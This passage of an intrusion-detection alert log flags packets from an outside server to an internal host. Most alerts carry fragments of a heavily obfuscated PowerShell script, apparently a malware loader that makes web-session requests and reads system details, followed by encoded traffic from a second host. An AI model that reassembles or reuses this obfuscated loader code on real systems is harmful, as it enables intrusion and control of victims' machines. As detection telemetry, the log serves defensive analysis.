3733+3839),(703685/6119),(4140-(23446988/5821)),(2577-(94+2372)),(-8584+(6043+2659))) -join ''); ([efhniujbapg]::(([char[]]@((632390/5749),(-5653+(1620+4134)),(-8567+8686)) -join ''))(@((8612-8513),(5547-5439),(627311/6211),(7258-7137),(-4575+(43766790/9322)),(-3799+(6705-2792)),(878680/(12110-4122)),(856374/(79481202/(16796-(15203230/2185)))),(-7265+7380),(1109360/(15332-5427)),(-3698+(31744206/(11667600/(6669-5269)))),(617022/(10735-(20234550/3675))))))=$wxgcpnqbf; }; [hcqzstiefywu]::((-join (
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.240447
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
,(1035302/(6568+(17898405/5595))),(3831-(32649384/8772)),(2116-(17185462/(10048-(4298-2783)))),(508563/4203),(2201-(8284094/3958)),(420105/(27854962/6962)),(7989-7876),(827982/7263)) -join ''))().(([efhniujbapg]::((-join (@((4478-(8089536/1852)),(1006667/(91945575/9225)),(1126335/9465))| ForEach-Object { [char]$_ })))(@((403200/(1503+3297)),(-4331+4442),(-9469+9552),(-8943+(1497+(19215042/2541))),(901740/7910),(-8767+(81507064/(15822-(11806-(-3854+9025))))),(388410/3531),(-8007+(15088-6978))))))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.242080
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(13758-(4334+3003)))))),(7843-(10979-(4745-(4811-3318)))),(5500-5399),(778587/(2410+(17644624/3728))),(1411-1365),(-6127+6205),(302091/2991),(677904/5844),(231150/5025),(4818-(437+(7239-2945))),(-1650+1751),(681688/6956),(581440/7268),(-7576+7690),(239649/(5846572/(10335-7627))),(895800/7465),(247808/(8673-6625)))| hptwcoskzgx { [char]$_ }))); $ofiyrwqgtna=huxrfn (([char[]]@((4144-(2719+(-2296+3644))),(-3582+3687),(9496-9397),(-3425+3539),(362193/(6398-(-3642+(63676692/(17193-7797))))),(431595/3
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.244199
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
9+(51484782/(19691-10037))),(327450/2950),(8650-(11316-(4626-1840))),(-5633+5754)) -join ''))=$foutwrnxka; $czinkqpaojm = mjrfhlb $global:mdtgwnxlu.([efhniujbapg]::(([char[]]@((-10119+(38931574/(2375+(9088281/(34111221/5371))))),(739421/(63992861/(11968-(12188379/3777)))),(378182/3178)) -join ''))(@((-4180+4285),(1095930/9963),(-5456+5574),(502497/(22558041/(11485-(13651-(38497365/(10628-5243)))))),(4576-4469),(6099-(-3825+(53378182/5434))),(7884-7785),(8417-(9585124/(2493794/(5307416/(6336480/(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.246821
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
792/(6965-1949)),(-3454+(-980+(-4208+8747))),(341700/(25476750/7605)),(-4970+(1791+3300)),(-2682+2728),(1108557/(5436+(9230-(14860-10181)))),(1124838/9867),(965007/9369)))) -WebSession $ofiyrwqgtna; } catch { $foutwrnxka=corudaisxhlv ($global:mdtgwnxlu.([char[]]@((6288-6183),(1541-1431),(-7250+(43463832/5899)),(10037-9926),(-1027+(2525-(10329566/7426))),(544491/5391),(8661-8562),(6930-(9848-(-7067+(1620+8476)))),(-2397+(8556-(-2490+(11041-2501)))),(932277/8553),(1394-(-4103+5400)),(-5963+(161420
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.249531
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
)(@((287903/3739),(-7899+8004),(112068/1132),(9816-9702),(5604-5493),(453790/(-5824+(16525-6755))),(846375/7625),(-8063+8165),(490332/(11258-(-1015+(53063370/6595)))),(4218-4172),(-6130+6210),(-3561+(7435-(1571+2192))),(210154/1766),(987174/(8086+1688)),(247152/(7399384/(6163-2750))),(6282-6199),(486720/4680),(-6864+6965),(5436-(39634992/(955+6484))),(-1809+1917),(8401-(9967515/(-7262+(10366-(-7753+(575+(34501844/3796))))))),(389940/5820),(8859-8748),(-3946+4055),(469027/4303),(-5462+(56373819/(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.251321
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(798001/7901),(954142/8018)))))(@((962535/(1454+7713)),(-4935+5047),(-1898+2003),(-3253+(1093+(6644-(13079-(2525+6180))))),(-2092+(4513-(-7318+9637))),(-1343+(5747662/3953)),(7021-6975),(9971-(90096312/9132)),(777333/7003),(86809/1847),(-5286+(11084-5693)),(1015392/(4650+(1590+2826)))))) -WebSession $ofiyrwqgtna; }$insoud = (vpsanxjfc ([char[]]@((431085/(2127+2828)),(-9720+(7321+(10386592/4148))),(891220/(16640-8538)),(-7176+7227),(-3123+(793+(-2262+4642))),(10067-(48204648/4834)),(1597-1530),(-
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.253905
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
899-9030)),(10153-(70080264/6969)),(-5098+(1323+(9767-(-1166+7048)))),(689800/(-1198+(-1595+(4255+(17036424/3134)))))) -join '').([char[]]@((6081-5980),(439560/(12318669/3363)),(167328/(6799194/4551)),(836431/(34569607/4009)),(8411-8301),(785500/7855),(171350/1490),(829864/(5263+(-906+(7621-(8305-(5194-(-2787+4500))))))),(-1575+(9593-7904)),(1019550/9710),(532070/(19372185/(10690-(-2303+8988)))),(-6633+(16361744/2429))) -join '')(-join (@( (-8619+(52558986/6051)),(-7654+(51415488/(-469+7093))),(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.256216
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
n ''))(); (-join (@((-6926+(16668-(34458258/(20607914/(8535583/1477))))),(3155-3072))| nwmcldptxyvh { [char]$_ })) = (-join (@((9408-9321),(7280-7175),(-7248+(15989-8631)),(359400/(-3295+6889)),(805527/7257),(7175-(43535520/(3759+(8042-(-192+5823))))),(6067-(8460-2508)),(8511-(4105+(955+(18602779/5441)))))| nhkrxvj { [char]$_ }))+[yfagsmwuxleo]::OSVersion.Version+ $global:mdtgwnxlu.([efhniujbapg]::(([char[]]@((5349-5239),(681245/6745),(428995/3605)) -join ''))(@((6628-(-1742+(5274+(-2298+(11693-
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.258438
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
| ForEach-Object { [char]$_ })))(@((-3060+(-1364+(12822-(11333-3017)))),(2965-(11197-(18982574/2278))),(190176/1698),(600480/5560),(-9087+9184),(6448-6349),(-6139+(-2592+(86889216/9838)))))))($global:mdtgwnxlu.(-join (@((893760/(17901-9389)),(729740/6634),(-1739+1857),(4508-(6019493/1369)),(540457/(10442-5391)),(9905-(11529-1725)),(992970/10030),(1798-1687),(-4981+(13831-8741)),(5249-(12815-7675)),(5119-5022),(2301-(420+(-1396+(-5571+(15663-6925))))),(-9933+10033))| zlituk { [char]$_ })).([efhni
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.263088
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
28/(181+2195))),(1142736/(4639+5564)),(10238-10141),(1721-1611),(-7506+(65305116/8586)),(755895/6573),(-4835+(-2292+(14323-(11847-4767)))),(-4048+(13398-9236)),(6607-(16321-9819)),(-6446+(1043+5513)),(-2573+2676))))([char[]]@( (-5449+5503),(169520/3260),(9258-(-658+9818)),(-1216+(-4535+(14486-8630))),(4590-4474)) -join '')).(([char[]]@((5250-(-570+5738)),(4299-(11939112/2844)),(1587-(3993-2518)),(-4757+4865),(469771/(23745229/(44931092/9164))),(-4567+4666),(2344-(6355-(27867024/6777)))) -join ''
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.264829
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
-5965+(8896-2830)),(174335/(8647895/5903))) -join ''))(@((8207-(69221253/8549)),(975963/(17558-(16760-8865))),(-3585+3704)))))(@((-4503+4608),(-6639+6749),(6480-6362),(322011/(12350-9449)),(1305-(3298-2100)),(-1779+1880),(6565-6466),(2614-(14016800/5600)),(-2791+2900),(1035064/(10626024/1119)),(835461/(14872-6259)),(922570/(14202-(-3663+(1301+8177)))),(8886-8786)))).([efhniujbapg]::(([efhniujbapg]::((-join (@((938630/(-1188+9721)),(-7941+8042),(5017-4898))| ForEach-Object { [char]$_ })))(@((1595
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.266558
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
})); ([char[]]@((-4783+4848),(326900/(7940401/(8425-(53466332/8917)))),(-1130+1239),(-1440+1545),(6206-(642+5454))) -join '') = [wnvtdx]::(([char[]]@((-5085+(14551600/2800)),(-3935+4056),(1054902/9678),(10047-9939),(-2264+(4660-(-493+(-3608+(15079-8695))))),(-3648+3749),(-3673+(-5199+8983)),(-10114+10228),(1931-(9367-(413+7128)))) -join ''))().((-join (@((841260/(74561675/7445)),(955710/8610),(4951-(737+4131)),(650992/(178+5434)),(8832-8718),(-9490+9595),(-4583+(6715-(10374882/5131))),(849338/(3
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.268271
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
))))))))),(-4307+4426)))))(@((6378-(149+(10949-(1285+3545)))),(-7217+7318),(765289/6431)))))(@((-4284+4366),(7241-(4402+(-4561+(-660+(10903830/(10988770/(393+(69109680/9060)))))))),(-8788+8900),(7212-7104),(-7276+(-890+8263)),(-3291+3390),(-9564+(1798+(26629795/(-4638+(13038-(42487080/8472))))))))))($global:mdtgwnxlu.(-join (@((-4104+(-3079+7288)),(5190-(9440-4360)),(-2273+2391),(1424-1313),(1771-1664),(409757/4057),(516285/5215),(2488-2377),(4095-3986),(1505-(2570036/(7419-(13236594/2373)))),(8
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.269885
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
111+2220),(-3185+3294),(293522/3026),(8676-(16739-(62196530/(10090860/1326)))),(-7817+(3619+4298))))).(-join (@((178871/1771),(-3946+(-1769+5835)),(-5128+5240),(-3169+3266),(-8923+(6132+2901)),(1004200/10042),(7554-(13969-(39643630/(56490655/9305)))),(-9326+9442),(5000-(7017-2131)),(-6248+(52939549/8333)),(9328-(1138+8080)),(564646/(-757+(16325-(4057+(32158686/(7915656/1484)))))))| hcaobdynviu { [char]$_ }))([char[]]@( (-7338+(16575-(7353+(11208678/6162)))),(5303-5203),(309778/(7488670/2635)),(8
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.271613
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
iujbapg
68b6
]::(([char[]]@((7436-(3086+(28806560/6794))),(288052/2852),(1663-1544)) -join ''))(@( (321504/(-140+3292)),(-7732+7829),(-8797+(68461640/(214+7474))),(-4280+4395),(-5393+(7239-1745))))), $global:mdtgwnxlu.([efhniujbapg]::(([char[]]@((1038510/(4832+(9079-4470))),(679326/(9302058/1383)),(-5983+6102)) -join ''))(@((723240/(12696-(2175+(18895233/5201)))),(2431-2321),(1076750/(13838-(2478+2235))),(-9098+9209),(-2807+2914),(583679/5779),(936639/9461),(6411-6300),(413001/(9719-(25599810/
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.273750
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
7067+7168))))= $insoud; ([efhniujbapg]::(([char[]]@((268510/2441),(-9782+(5181+(3288+1414))),(7731-(49889048/6554))) -join ''))(@((5129-5025),(-4635+4734),(8063-7950),(-3783+(15761952/4054)),(-8840+8947),(243210/2010),(-9881+(5871+(28730025/(40754925/(13764-7921))))),(4215-(2116+1983)),(-5953+(49974310/(12456-4223))),(-1323+1424),(536428/(6145-1599)),(-3843+(-4108+(22060510/2735)))))) = ""; ([char[]]@((-6489+(3667+(-3091+(12104-(11463-(11124126/(381+(7909-6208)))))))),(-3053+3167),(6888-6777),(-
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.276622
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
apg]::(([efhniujbapg]::(([efhniujbapg]::((-join (@((923010/8391),(543279/(14267-(2396+6492))),(7040-6921))| ForEach-Object { [char]$_ })))(@((-2997+(-4331+7438)),(-6985+7086),(2329-(-4805+(60279895/(2425+6168))))))))(@((-4184+(-3687+7981)),(-5124+(-365+5590)),(776594/6526)))))(@((5608-5498),(299566/(8812-5846)),(326893/2747)))))(@( (6454-6401),(-3464+3513),(528887/9979)))); }; $keylisp= [hcqzstiefywu]::(([efhniujbapg]::((-join (@((1231-1121),(8656-8555),(-1243+(5548-4186)))| ForEach-Object { [ch
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.278383
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
]@((-9384+(659+8812)),(-8665+8744),(-2480+(6425-(35945215/(75240230/8086)))),(-1416+1491),(4234-(6404-2241)),(569490/6945),(459938/(14965-(14461-5318))),(809795/9527),(10043-9963)) -join '') -and $joylants.(([char[]]@((-8382+(-1606+(4535+5521))),(-3380+(-5455+8946)),(3265-(7251-(31355415/(12291-(43207416/9324))))),(-8323+(23693880/2814)),(3571-3466),(-4604+4714)) -join '')) -ne $global:mdtgwnxlu.([char[]]@((9738-(15860-(8373-(-6624+(29274260/3338))))),(237050/(270+(14476800/(14490-6810)))),(-991
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.279943
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(8008-(2896+5012)),(-8702+(991+7826)),(688344/5934),(-5583+(13923-8226)),(-7242+(13039-(8304628/(4621-3162)))),(8768-(15188-6530)),(-6602+(67519350/10070)))| rlezwkctausip { [char]$_ }))(-join (@( (-6790+(9346-(8979-(14185-7677)))),(-1534+(10819-9202)),(6131-6062),(-4708+(29348330/(45364308/7404))))| fzrydsbouhlvin { [char]$_ })); }return $mtbrzpyjwdi }catch{ return ([efhniujbapg]::(([char[]]@((7969-7859),(223412/(11392-9180)),(323799/(-5847+8568))) -join ''))(@((654920/(75465496/(11285-3219))),
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.281450
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
)))))),(683320/6212),(211338/(2673963/(-3208+(20176692/4292)))),(-3751+(-3709+(-1032+8603))),(-5470+5577),(10000-9899),(721116/(-2411+9695)),(-1068+1179),(8099-7990),(2961-(11878-(17158426/(6883-4982)))),(-4405+4502),(-9228+(60342156/(53078868/(45924474/5591)))),(748700/(3671+(10295568/2698))))| trjicugwxolmyn { [char]$_ })).(-join (@((449955/4455),(2487-2367),(2892-2780),(834103/8599),(6551-6441),(-2826+2926),(7837-7722),(1878-1762),(-1308+(8044254/5657)),(885255/8431),(-5806+(14571-(10714-2059
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.283142
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
-4620),(5649-5581),(3140-(13353366/4394)),(2335-(14024192/(42875392/6836))),(5258-5147),(-1226+1326),(1960-1859),(291384/(-5984+(80002720/9368))),(-1335+(4490-3040))) -join ''))(); foreach ($iwcpbqamrhlzxf in $pgdhrzlfwxj) { if ($iwcpbqamrhlzxf.FormatID -eq $erzkjpnl.Guid) { return $iwcpbqamrhlzxf } } return $null }} class dzawuiopegsrnx { static $efmixcvh; static [bool] enafqvcxz() { $dfkwjypleaconx = $false; [dzawuiopegsrnx]::efmixcvh = ijcsveqydwl (-join (@((-4644+(14062825/(6211800/(9824040/
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.284577
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
66-(19625-(14176-(1511+3119))))),(6424-6313),(563270/4898),(-5105+(11375-6169)))| ForEach-Object { [char]$_ })))(); $this::efmixcvh = $null; } }}class ndbzhroc { static $kdziqtorjwe = ([efhniujbapg]::((-join (@((-3010+3120),(743663/(4671+(-4655+(8594-(6978-(40472322/(9548-2486))))))),(3042-(12449057/(314+3945))))| ForEach-Object { [char]$_ })))(@((6677-(9363951/1413)),(-6813+(16736-9870)),(131868/2442),(463644/(5168+3580)),(1513-1457)))); static $svmworudjhe = @(); static $yikgmwbpujcenv = [yfag
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.286905
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
41-(-3199+5997))),(-7096+7215)))))(@((-4445+(-2776+(13403-6114))),(-1049+(5002290/4365)),(666468/(1440+(13755-9687))),(9387-9308),(-8497+(16105-(12632598/(14633685/8695)))),(-1024+1113),(1007980/(59820120/(21776202/(26281122/7234)))),(-8523+(12893-4273)),(10336-10222))))) / (8483-(11124-2648))) + (2193/(-6108+(17962-9661))); $zythnujavsbxdf = $zlfrwymi.((-join (@((-10070+10159),(774468/7668),(7088-(10939-3948)),(307458/2697))| hbmkyqjrcoxzgl { [char]$_ }))); $ugnmaltbz = $zsmcyaid+$zythnujavsbxd
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.289112
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
59704/(11512-3904)),(3840-(12151-(591+(33553022/4283)))),(1129070/9818),(636840/5490),(633087/(-4307+9718)),(996274/8443),(1167628/9812),(604680/5039),(746691/6171),(473360/(8387-(13379-(4397+4475)))),(5055-(7838-(-3984+(-1197+(1817+6195))))),(160475/3275),(201200/4024),(140046/(51+(8259-(31052684/(9508-(10680-6753)))))),(-1588+(11237-(1144+(46685919/(11694-6171))))),(6983-(-2812+(21861048/(8056-(35685680/(14030-7890)))))),(-4284+4338),(-1559+1614),(-3078+(15391074/(-3873+(38886768/(-2528+6955))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.294515
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
ar[]]@((-7439+7485),(972876/9538),(2370-2253),(-4788+4898)) -join ''); $vgabfrnzwhkmy+=$pihubrwkela+(-join (@((4735-4689),(4422-4323),(638694/(-51+5805)),(8845-8736))| cvrows { [char]$_ })); $vgabfrnzwhkmy+=$pihubrwkela+([efhniujbapg]::(([char[]]@((-2758+(1511+(-8062+(6268+(-230+3381))))),(1435-1334),(-3081+(9061-(26661689/(13628804/(11241-(36714985/4453))))))) -join ''))(@((86802/(9639-(78357216/(2214+(53939702/6833))))),(519240/4327),(4010-(7956894/2046)),(270108/2214)))); $vgabfrnzwhkmy+=$pih
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.296226
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(11107-(13851-9065))))),(9009-(-612+9520)),(-3115+(8689632/2702)),(564928/5044)) -join ''))($tijmnbfw); }}function avinwgpcrb { $cmtwhsfged = (-4362+4364); if ($cmtwhsfged -le (-6306+6306)) { return } [zdyqvhltcxma]::(([char[]]@((-2016+2099),(1040256/9632),(745885/(62351555/8443)),(4557-4456),(2640-(-4977+7505))) -join ''))($cmtwhsfged * $jlzfbg);}function tvcgkaf { if (-not [hcqzstiefywu]::foulwkb) { [hcqzstiefywu]::((-join (@((-6726+6841),(1725-1604),(4013-3908),(713868/7068),(189104/(441+1343
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.299089
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(53368192/5692)))))) -join ''))(); $oqgjmzbk =@{ ([char[]]@((393024/5696),(8946-(15078224/(8533-(43256850/6338)))),(4664-(9039303/1981)),(8331-8221),(-9707+(56108976/(15870-(6638+(13542-10022))))),(9619-9541),(-6239+6336),(-9405+(4635+(12975-8096))),(-6314+(48523060/(-1642+(2010+7196))))) -join '') = (-join (@((-6718+6817),(-9676+9773),(614304/(1710+(-1727+5705))),(565056/(3397+1835)),(-3987+(-4871+8956)),(804227/(69868257/(56342922/(-3094+9780)))),(-2205+2304),(952193/8899),(-8545+(5020+3624)),
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.302034
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
49),(233496/2162),(482976/(5759936/1288)),(371224/(7656-(9986-6118))),(-5357+5454),(5598-5499),(9655-9548)) -join ''));}function wvlbuqzfjypa { param( [parameter(Mandatory=$true)] [ValidateNotNullOrEmpty()] $tqghdwufyvkozx ) $icgfrqpeld = [nqpmlgedoyr]::(([efhniujbapg]::(([char[]]@((990220/(65687594/7297)),(824564/8164),(-2388+(-6915+9422))) -join ''))(@((-2090+(-3038+(35062716/6708))),(-4921+5035),(-5061+5162),(3599-3502),(-2903+3019),(301283/(6470-(5797-2310)))))))(); $vxjkefda =@{ (-join (@((
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.304391
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(5724-3533)),(-3107+(24778592/7724)),(-7475+7594))| ForEach-Object { [char]$_ })))(@((6469-6359),(-6615+6716),(9732-(12245-(9958-7326)))))))(@((-5652+5717),(-6682+6781),(614336/5296),(-7725+(57550500/(16057-(17776-9069)))),(-9965+(3377+(-890+7589))),(-6664+6774)))) = $tqghdwufyvkozx; (-join (@((-10080+10189),(663570/(3809+2761)),(654580/5692),(451950/(-3615+7545)),(4599-(13942-9440)),(4475-4372),(308252/3052),(8374-(54897990/6635)),(-3589+3686),(659924/(-2653+8342)),(-7277+(66299634/(26406567/29
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.305192
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 204 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
344700/7942)),(-8177+8291),(-4539+4606),(-2407+2504),(1028916/(5789+3738)),(-9606+9714),(436786/4457),(2877-(10964320/3944)),(327987/3313),(7346-(2812+(14254-(27908680/2840))))))));}nvgsdqbt;
'@

0


==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.354988
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] Iy1z4Tdm4Xof/+D18cGx8gNoNuT50Ag4o1Qou+kgUC1emSjzvkVpVBIpP6SeFM6t+MciksQ5nDoEoq5qv40jTh8Im2UHqnWZSBixAJe1d3QxXdSgmrGZK4LFMux3L6o9zONAnQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.356777
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] YHL3fP4nWPsK3apadXq5iaN/xVldfasG24aU6+VHjEicT800c5xRtmDtAqJI0lLwq4UXcqVVndgpijBkdOq0+1CCAyjZxd+f2gmaDHko30BjjznVTZo8UBxP2swD+MdlGIvr5A==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.358950
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] cGRhO8i7pNHb/7QXZcYkvBs/DRiU/rsGCZYCDEamHHaVuuZPfw6QSWVXlmK978Fa7ukASPPNFlhw/BNZKAWwCLC/aZAUk8basvHz7LfaN3AWmyfTNu8mAxwG1pmQx3paGT2LJQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.360241
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 5.161.113.150:25658
  Destination: 10.2.21.101:64068
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] WTdA4l5f+AUk/beA/kwEllDcTB6uHYRa7Zck+nHza3XQ0sotqdflG3IFhhgYqG9WmQhEsXs3Ubyg0NT336WF8GoUo2O1Rxj93sz90ng5TxnWM/Y5/G0tgmCHsBvHY5poFk4sjQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.363922
Signature(s): 
Threat Score: 4

Packet Info:
